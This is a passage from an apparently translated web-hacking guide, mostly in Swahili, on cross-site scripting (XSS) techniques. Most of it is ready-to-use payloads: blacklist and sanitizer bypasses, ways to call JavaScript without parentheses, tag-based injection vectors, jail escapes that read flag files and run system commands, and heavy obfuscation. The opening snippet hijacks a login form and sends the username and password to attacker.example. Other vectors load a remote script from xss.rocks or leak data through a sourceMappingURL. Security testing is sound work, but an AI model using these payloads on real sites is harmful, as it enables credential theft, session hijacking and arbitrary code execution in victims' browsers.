Tofauti muhimu ya wigo: `const`/`let` zinazotangazwa ndani ya `eval()` zina block-scope na HAZIUNGEZI globals; hazitapatikana kwa scripts zinazofuata. Tumia elementi ya `<script>` inayochomwa dynamically ili kufafanua global, non-rebindable hooks unapohitaji (e.g., to hijack a form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Reference: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Kuweka kwa Unicode kwa utekelezaji wa JS
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists techniques

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Escapes maalum**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Ubadilishaji wa nafasi ndani ya msimbo wa JS**
```javascript
<TAB>
/**/
```
**Maoni ya JavaScript (kutoka** [**JavaScript Comments**](#javascript-comments) **trick)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript mistari mipya (kutoka** [**JavaScript new line**](#javascript-new-lines) **triki)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**Nafasi tupu za JavaScript**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript ndani ya comment**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript bila mabano**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Mwito wa function yoyote (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Kuna **JS code** inayotumia **unsafely data controlled by an attacker** kama `location.href`. Mshambulizi anaweza kuibua hili kutekeleza arbitrary JS code.\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Ukitoka hapo utapata **maelezo ya kina kuhusu nini DOM vulnerabilities ni, jinsi zinazosababishwa, na jinsi za kuzitumia**.\
Pia, usisahau kwamba **mwishoni mwa chapisho hicho** unaweza kupata maelezo kuhusu [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Upgrading Self-XSS

### Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a **subdomain dhaifu kwa XSS**, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

You can find a great abuse of this technique in [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Kutuma session yako kwa admin

Huenda mtumiaji anaweza kushiriki profile yake na admin na ikiwa self XSS iko ndani ya profile ya mtumiaji na admin akiifungua, ataichochea hitilafu hiyo.

### Session Mirroring

If you find some self XSS and the web page have a **session mirroring for administrators**, for example allowing clients to ask for help an in order for the admin to help you he will be seeing what you are seeing in your session but from his session.

Unaweza kumfanya **administrator achochee self XSS yako** na kuiba cookies/session yake.

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

When a web app uses Emscripten/WASM, constant strings (like HTML format stubs) live in writable linear memory. A single in‑WASM overflow (e.g., unchecked memcpy in an edit path) can corrupt adjacent structures and redirect writes to those constants. Overwriting a template such as "<article><p>%.*s</p></article>" to "<img src=1 onerror=%.*s>" turns sanitized input into a JavaScript handler value and yields immediate DOM XSS on render.

Check the dedicated page with exploitation workflow, DevTools memory helpers, and defenses:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Unaweza kukagua kama **reflected values** zinakuwa **unicode normalized** kwenye server (au upande wa client) na kutumia utendakazi huu kupitisha kinga. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Kutokana na **RoR mass assignment** nukuu zinaingizwa kwenye HTML na kisha vizuizi vya nukuu vinavukwa na shamba za ziada (onfocus) zinaweza kuongezwa ndani ya tag.\  
Mfano la fomu ([from this report](https://hackerone.com/reports/709336)), ikiwa utatuma payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Jozi "Key","Value" itarudiwa hivi:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Kisha, sifa onfocus itaingizwa na XSS itatokea.

### Mchanganyiko maalum
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Ikiwa unagundua kuwa unaweza **inject headers in a 302 Redirect response** unaweza kujaribu **make the browser execute arbitrary JavaScript**. Hii si rahisi kwani vivinjari vya kisasa havitafsiri HTTP response body ikiwa HTTP response status code ni 302, hivyo payload ya cross-site scripting peke yake haina maana.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) unaweza kusoma jinsi ya kujaribu several protocols inside the Location header na kuona kama yoyote yao inaruhusu browser inspect na execute the XSS payload ndani ya body.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Only Letters, Numbers and Dots

Ikiwa unaweza kuonyesha **callback** ambayo javascript itafanya **execute** ikikwamishwa kwa herufi hizo. [**Soma sehemu hii ya chapisho**](#javascript-function) ili ujifunze jinsi ya kutumia tabia hii.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Ikiwa ujaribu ku-load script yenye **content-type** kama `application/octet-stream`, Chrome itatoa makosa yafuatayo:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

The only **Content-Type**s that will support Chrome to run a **loaded script** are the ones inside the const **`kSupportedJavascriptTypes`** from [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Aina za skripti kwa XSS

(Kutoka [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Kwa hivyo, ni aina zipi zinaweza kuonyeshwa ili kupakia skripti?
```html
<script type="???"></script>
```
Jibu ni:

- **module** (default, hakuna cha kuelezea)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles ni kipengele kinachokuwezesha kufungasha mseto wa data (HTML, CSS, JS…) pamoja ndani ya faili ya **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Inaruhusu kuboresha sintaksia ya import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Tabia hii ilitumiwa katika [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) kuremapa library kwa eval, na kwa kutumia vibaya inaweza kusababisha XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Kipengele hiki kinakusudiwa hasa kutatua baadhi ya matatizo yanayosababishwa na pre-rendering. Kinafanya kazi hivi:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Aina za Content-Types za Wavuti kwa XSS

(Kutoka [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Aina zifuatazo za content types zinaweza kutekeleza XSS katika browsers zote:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

Katika browsers nyingine, aina nyingine za **`Content-Types`** zinaweza kutumika kutekeleza JS yoyote, angalia: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Ikiwa ukurasa unarudisha content-type ya text/xml, inawezekana kuainisha namespace na kutekeleza JS yoyote:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Mifumo Maalum ya Ubadilishaji

Wakati kitu kama **`"some {{template}} data".replace("{{template}}", <user_input>)`** kinapotumika, mshambuliaji anaweza kutumia [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the-replacement) ili kujaribu kupitisha baadhi ya kinga: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Kwa mfano katika [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), hili lilitumika ku-escape string ya JSON ndani ya script na kutekeleza msimbo wowote.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

If you are only have a limited set of chars to use, check these other valid solutions for XSJail problems:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Ikiwa **kila kitu ni undefined** kabla ya executing untrusted code (kama katika [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) inawezekana kuunda useful objects "out of nothing" ili abuse the execution of arbitrary untrusted code:

- Kutumia import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Kufikia `require` kwa njia isiyo ya moja kwa moja

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) moduli zimefungwa na Node.js ndani ya function, kama ifuatavyo:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Kwa hivyo, ikiwa kutoka moduli hiyo tunaweza **kuita function nyingine**, inawezekana kutumia `arguments.callee.caller.arguments[1]` kutoka kwa function hiyo kupata **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Kwa njia sawa na mfano uliotangulia, inawezekana **kutumia error handlers** kufikia **wrapper** ya module na kupata kazi ya **`require`**:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Obfuscations tofauti kwenye ukurasa mmoja:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- JSFuck ya hali ya juu: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
```

```javascript
//aaencode
ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
